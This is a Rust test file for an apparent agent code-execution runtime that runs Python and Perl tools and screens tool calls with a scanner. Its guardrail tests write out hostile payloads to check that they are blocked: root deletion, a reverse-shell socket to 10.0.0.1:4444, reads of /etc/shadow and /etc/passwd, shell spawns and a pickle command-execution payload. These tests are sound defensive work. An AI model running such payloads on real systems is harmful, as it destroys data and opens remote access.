use serde_json::json;
use tagisan::ecc::agentshield::{AgentShieldScanner, AgentShieldVerdict, ThreatLevel};
use tagisan::perl::PerlRuntime;
use tagisan::python::PythonRuntime;
use tagisan::tools::ToolRegistry;
use tagisan::types::ContentBlock;

// =========================================================================
// 1. Discovery & Version Probing
// =========================================================================

#[tokio::test]
async fn test_python_discovery_and_version() {
    let python_path = PythonRuntime::find_python();
    assert!(
        python_path.is_some(),
        "Python binary must be discovered automatically on the system"
    );

    let runtime = PythonRuntime::new().expect("PythonRuntime::new should succeed");
    assert!(runtime.is_available(), "Python runtime must be available");
    assert!(
        runtime.python_path().is_file(),
        "Python path must point to an actual executable file"
    );

    let version = runtime.version().await.expect("python --version should succeed");
    println!("Discovered Python Version: {version}");
    assert!(
        version.to_lowercase().contains("python 3"),
        "Expected Python 3.x version string, got '{version}'"
    );
}

#[tokio::test]
async fn test_perl_discovery_and_version() {
    let perl_path = PerlRuntime::find_perl();
    assert!(
        perl_path.is_some(),
        "Perl binary must be discovered automatically on the system"
    );

    let runtime = PerlRuntime::new().expect("PerlRuntime::new should succeed");
    assert!(runtime.is_available(), "Perl runtime must be available");
    assert!(
        runtime.perl_path().is_file(),
        "Perl path must point to an actual executable file"
    );

    let version = runtime.version().await.expect("perl -v should succeed");
    println!("Discovered Perl Version: {version}");
    assert!(
        version.contains("5.") || version.to_lowercase().contains("perl"),
        "Expected Perl 5.x version string, got '{version}'"
    );
}

// =========================================================================
// 2. Python Runtime Real Execution
// =========================================================================

#[tokio::test]
async fn test_python_eval_arithmetic() {
    let runtime = PythonRuntime::new().expect("Python runtime initialization");
    let res: PythonExecutionResult = runtime
        .eval_code("print(6 * 7)", None)
        .await
        .expect("Python arithmetic eval should succeed");

    assert_eq!(res.exit_code, 0);
    assert!(res.success);
    assert_eq!(res.stdout.trim(), "42");
    assert!(res.duration_ms < 5000);
}

#[tokio::test]
async fn test_python_eval_json_manipulation() {
    let runtime = PythonRuntime::new().expect("Python runtime initialization");

    let code = r#"
import json

data = {
    'engine': 'Tagisan',
    'languages': ['Rust', 'Bun', 'Python', 'Perl'],
    'status': 'production-grade'
}

encoded = json.dumps(data)
decoded = json.loads(encoded)
decoded['languages'].append('C-FFI')

print(f"Total: {len(decoded['languages'])}, Primary: {decoded['engine']}")
"#;

    let res = runtime
        .eval_code(code, Some(10))
        .await
        .expect("JSON manipulation script should succeed");

    assert_eq!(res.exit_code, 0);
    assert!(res.success);
    assert!(res.stdout.contains("Total: 5, Primary: Tagisan"));
}

#[tokio::test]
async fn test_python_eval_multiline_function() {
    let runtime = PythonRuntime::new().expect("Python runtime initialization");

    let code = r#"
def fibonacci(n):
    a, b = 0, 1
    for _ in range(n):
        a, b = b, a + b
    return a

print(f"FIB_10={fibonacci(10)}")
"#;

    let res = runtime
        .eval_code(code, Some(10))
        .await
        .expect("Multiline Fibonacci function execution");

    assert_eq!(res.exit_code, 0);
    assert!(res.success);
    assert!(res.stdout.contains("FIB_10=55"));
}

#[tokio::test]
async fn test_python_syntax_and_package_check() {
    let runtime = PythonRuntime::new().expect("Python runtime initialization");

    // Valid syntax
    let valid_syntax = runtime.check_syntax("def test_ok():\n    return 42\n").await;
    assert!(valid_syntax.is_ok());
    assert!(valid_syntax.unwrap(), "Valid syntax must return true");

    // Invalid syntax
    let invalid_syntax = runtime.check_syntax("def test_bad( return 42\n").await;
    assert!(invalid_syntax.is_ok());
    assert!(!invalid_syntax.unwrap(), "Invalid syntax must return false");

    // Existing standard package
    let json_pkg = runtime.check_package("json").await.expect("Check json package");
    assert!(json_pkg, "Standard library 'json' must be detected");

    let sys_pkg = runtime.check_package("sys").await.expect("Check sys module");
    assert!(sys_pkg, "Built-in 'sys' must be detected");

    // Non-existent package
    let bogus_pkg = runtime.check_package("definitely_not_a_real_python_package_xyz_99").await.expect("Check bogus package");
    assert!(!bogus_pkg, "Non-existent package must return false");
}

// =========================================================================
// 3. Perl Runtime Real Execution
// =========================================================================

#[tokio::test]
async fn test_perl_eval_arithmetic() {
    let runtime = PerlRuntime::new().expect("Perl runtime initialization");
    let res: PerlExecutionResult = runtime
        .eval_code("print 40 + 2;", None)
        .await
        .expect("Perl arithmetic eval should succeed");

    assert_eq!(res.exit_code, 0);
    assert!(res.success);
    assert_eq!(res.stdout.trim(), "42");
    assert!(res.duration_ms < 5000);
}

#[tokio::test]
async fn test_perl_eval_regex_replacement() {
    let runtime = PerlRuntime::new().expect("Perl runtime initialization");

    let code = r#"
my $text = "The quick brown fox jumps over the lazy dog";
$text =~ s/brown/silver/g;
$text =~ s/lazy/energetic/g;
print $text;
"#;

    let res = runtime
        .eval_code(code, Some(10))
        .await
        .expect("Perl regex evaluation");

    assert_eq!(res.exit_code, 0);
    assert!(res.success);
    assert_eq!(
        res.stdout.trim(),
        "The quick silver fox jumps over the energetic dog"
    );
}

#[tokio::test]
async fn test_perl_regex_transform_stream() {
    let runtime = PerlRuntime::new().expect("Perl runtime initialization");

    let input_text = "tagisan_engine_alpha tagisan_engine_beta";
    let transformed = runtime
        .regex_transform(input_text, "s/tagisan/TGS/g", Some(10))
        .await
        .expect("Perl regex stream transformation");

    assert_eq!(transformed.trim(), "TGS_engine_alpha TGS_engine_beta");
}

#[tokio::test]
async fn test_perl_eval_array_manipulation() {
    let runtime = PerlRuntime::new().expect("Perl runtime initialization");

    let code = r#"
my @languages = ('Rust', 'Python', 'Perl');
push @languages, 'Bun';
my @sorted = sort @languages;
print join(', ', @sorted);
"#;

    let res = runtime
        .eval_code(code, Some(10))
        .await
        .expect("Perl array manipulation");

    assert_eq!(res.exit_code, 0);
    assert!(res.success);
    assert_eq!(res.stdout.trim(), "Bun, Perl, Python, Rust");
}

#[tokio::test]
async fn test_perl_syntax_check() {
    let runtime = PerlRuntime::new().expect("Perl runtime initialization");

    // Valid Perl syntax
    let valid_syntax = runtime.check_syntax("my $val = 100; print $val;").await;
    assert!(valid_syntax.is_ok());
    assert!(valid_syntax.unwrap(), "Valid Perl syntax must return true");

    // Invalid Perl syntax
    let invalid_syntax = runtime.check_syntax("my $val = ;;; {{ bad syntax").await;
    assert!(invalid_syntax.is_ok());
    assert!(!invalid_syntax.unwrap(), "Invalid Perl syntax must return false");
}

// =========================================================================
// 4. AgentShield Security Guardrails for Python and Perl
// =========================================================================

#[tokio::test]
async fn test_agentshield_blocks_dangerous_python_invocations() {
    // 1. os.system
    let py_os_system = json!({
        "code": "import os\nos.system('rm -rf /')"
    });
    let v1 = AgentShieldScanner::scan_tool_call("python_eval", &py_os_system);
    assert!(matches!(v1, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "os.system must be blocked");

    // 2. subprocess
    let py_subp = json!({
        "code": "import subprocess\nsubprocess.run(['dir'])"
    });
    let v2 = AgentShieldScanner::scan_tool_call("python_eval", &py_subp);
    assert!(matches!(v2, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "subprocess must be blocked");

    // 3. pty.spawn
    let py_pty = json!({
        "code": "import pty\npty.spawn('/bin/bash')"
    });
    let v3 = AgentShieldScanner::scan_tool_call("python_eval", &py_pty);
    assert!(matches!(v3, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "pty.spawn must be blocked");

    // 4. shutil.rmtree
    let py_rmtree = json!({
        "code": "import shutil\nshutil.rmtree('/etc')"
    });
    let v4 = AgentShieldScanner::scan_tool_call("python_eval", &py_rmtree);
    assert!(matches!(v4, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "shutil.rmtree must be blocked");

    // 5. pickle deserialization
    let py_pickle = json!({
        "code": "import pickle\nobj = pickle.loads(b'cos\\nsystem\\n(S\"echo pwned\"\\ntR.')"
    });
    let v5 = AgentShieldScanner::scan_tool_call("python_eval", &py_pickle);
    assert!(matches!(v5, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "pickle.loads must be blocked");

    // 6. Reverse shell socket pattern
    let py_revshell = json!({
        "code": "import socket, os\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('10.0.0.1', 4444))\nos.dup2(s.fileno(), 0)"
    });
    let v6 = AgentShieldScanner::scan_tool_call("python_eval", &py_revshell);
    assert!(matches!(v6, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "reverse shell must be blocked");

    // 7. Sensitive credentials file access
    let py_shadow = json!({
        "code": "with open('/etc/shadow') as f: print(f.read())"
    });
    let v7 = AgentShieldScanner::scan_tool_call("python_eval", &py_shadow);
    assert!(matches!(v7, AgentShieldVerdict::Block { .. }), "access to /etc/shadow must be blocked");
}

#[tokio::test]
async fn test_agentshield_blocks_dangerous_perl_invocations() {
    // 1. system()
    let perl_sys = json!({
        "code": "system('cat /etc/passwd');"
    });
    let v1 = AgentShieldScanner::scan_tool_call("perl_eval", &perl_sys);
    assert!(matches!(v1, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "system() must be blocked");

    // 2. exec()
    let perl_exec = json!({
        "code": "exec('/bin/sh');"
    });
    let v2 = AgentShieldScanner::scan_tool_call("perl_eval", &perl_exec);
    assert!(matches!(v2, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "exec() must be blocked");

    // 3. Backticks `...`
    let perl_backtick = json!({
        "code": "my $out = `whoami`; print $out;"
    });
    let v3 = AgentShieldScanner::scan_tool_call("perl_eval", &perl_backtick);
    assert!(matches!(v3, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "backtick execution must be blocked");

    // 4. qx operator
    let perl_qx = json!({
        "code": "my $out = qx/id/; print $out;"
    });
    let v4 = AgentShieldScanner::scan_tool_call("perl_eval", &perl_qx);
    assert!(matches!(v4, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "qx operator must be blocked");

    // 5. Piped open
    let perl_piped = json!({
        "code": "open(my $pipe, '| /bin/sh') or die;"
    });
    let v5 = AgentShieldScanner::scan_tool_call("perl_eval", &perl_piped);
    assert!(matches!(v5, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "piped open must be blocked");

    // 6. Destructive root unlink
    let perl_unlink = json!({
        "code": "unlink '/';"
    });
    let v6 = AgentShieldScanner::scan_tool_call("perl_eval", &perl_unlink);
    assert!(matches!(v6, AgentShieldVerdict::Block { threat_level: ThreatLevel::Critical, .. }), "root unlink must be blocked");
}

// =========================================================================
// 5. ToolRegistry Integration & Execution
// =========================================================================

#[tokio::test]
async fn test_tool_registry_registration_and_execution() {
    let registry = ToolRegistry::with_builtins();

    // Verify all 4 tools are registered
    assert!(registry.has_tool("python_eval"), "python_eval must be in ToolRegistry");
    assert!(registry.has_tool("python_run"), "python_run must be in ToolRegistry");
    assert!(registry.has_tool("perl_eval"), "perl_eval must be in ToolRegistry");
    assert!(registry.has_tool("perl_run"), "perl_run must be in ToolRegistry");

    // 1. Execute python_eval tool call successfully
    let py_call_args = json!({
        "code": "import math\nprint(f'SQRT_144={math.isqrt(144)}')"
    });
    let py_result = registry.execute_call("call_py_1", "python_eval", &py_call_args).await;
    if let ContentBlock::ToolResult { content, is_error, .. } = py_result {
        assert!(!is_error, "Benign python_eval must succeed: {content}");
        assert!(content.contains("SQRT_144=12"));
    } else {
        panic!("Expected ContentBlock::ToolResult for python_eval");
    }

    // 2. Execute perl_eval tool call successfully
    let perl_call_args = json!({
        "code": "my $ans = 7 * 8; print \"ANS=$ans\";"
    });
    let perl_result = registry.execute_call("call_pl_1", "perl_eval", &perl_call_args).await;
    if let ContentBlock::ToolResult { content, is_error, .. } = perl_result {
        assert!(!is_error, "Benign perl_eval must succeed: {content}");
        assert!(content.contains("ANS=56"));
    } else {
        panic!("Expected ContentBlock::ToolResult for perl_eval");
    }

    // 3. Verify AgentShield blocks malicious python_eval via registry
    let malicious_py = json!({
        "code": "import os\nos.system('echo pwned')"
    });
    let blocked_py = registry.execute_call("call_py_bad", "python_eval", &malicious_py).await;
    if let ContentBlock::ToolResult { content, is_error, .. } = blocked_py {
        assert!(is_error, "Malicious python_eval must be flagged as error");
        assert!(content.contains("AgentShield blocked tool 'python_eval'"));
    } else {
        panic!("Expected ToolResult for blocked call");
    }

    // 4. Verify AgentShield blocks malicious perl_eval via registry
    let malicious_pl = json!({
        "code": "system('echo pwned');"
    });
    let blocked_pl = registry.execute_call("call_pl_bad", "perl_eval", &malicious_pl).await;
    if let ContentBlock::ToolResult { content, is_error, .. } = blocked_pl {
        assert!(is_error, "Malicious perl_eval must be flagged as error");
        assert!(content.contains("AgentShield blocked tool 'perl_eval'"));
    } else {
        panic!("Expected ToolResult for blocked call");
    }
}

// =========================================================================
// 6. Script File Execution (.py & .pl)
// =========================================================================

#[tokio::test]
async fn test_python_and_perl_file_execution() {
    let temp_dir = std::env::temp_dir().join(format!("tgs_test_scripts_{}", std::process::id()));
    tokio::fs::create_dir_all(&temp_dir)
        .await
        .expect("Create temp script directory");

    // 1. Python script
    let py_script_path = temp_dir.join("calc.py");
    let py_script_content = r#"
import sys
if len(sys.argv) >= 3:
    a = int(sys.argv[1])
    b = int(sys.argv[2])
    print(f"PRODUCT={a * b}")
"#;
    tokio::fs::write(&py_script_path, py_script_content)
        .await
        .expect("Write test Python script");

    let py_runtime = PythonRuntime::new().expect("Python runtime");
    let py_res = py_runtime
        .run_file(&py_script_path, &["7".to_string(), "9".to_string()], Some(10))
        .await
        .expect("Run python file");

    assert_eq!(py_res.exit_code, 0);
    assert!(py_res.stdout.contains("PRODUCT=63"));

    // 2. Perl script
    let pl_script_path = temp_dir.join("calc.pl");
    let pl_script_content = r#"
my ($a, $b) = @ARGV;
my $product = $a * $b;
print "PRODUCT=$product\n";
"#;
    tokio::fs::write(&pl_script_path, pl_script_content)
        .await
        .expect("Write test Perl script");

    let pl_runtime = PerlRuntime::new().expect("Perl runtime");
    let pl_res = pl_runtime
        .run_file(&pl_script_path, &["8".to_string(), "8".to_string()], Some(10))
        .await
        .expect("Run perl file");

    assert_eq!(pl_res.exit_code, 0);
    assert!(pl_res.stdout.contains("PRODUCT=64"));

    // Cleanup temp dir
    let _ = tokio::fs::remove_dir_all(&temp_dir).await;
}
